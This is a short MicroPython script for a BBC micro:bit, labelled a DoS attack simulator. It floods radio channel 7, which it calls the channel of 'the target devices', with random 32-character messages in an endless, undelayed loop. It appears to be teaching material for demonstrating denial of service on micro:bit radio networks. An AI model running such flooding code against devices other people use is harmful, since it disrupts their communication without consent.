# DoS Attack Simulator Code
from microbit import *
import radio
import random

# Configure the radio
radio.on()
radio.config(channel=7)  # Use the same channel as the target devices

# Continuously flood the channel
while True:
    # Generate a random message
    random_message = ''.join([chr(random.randint(32, 126)) for _ in range(32)])  # 32-character string
    # Send the random message
    radio.send(random_message)
    # No delay to maximize the number of messages sent
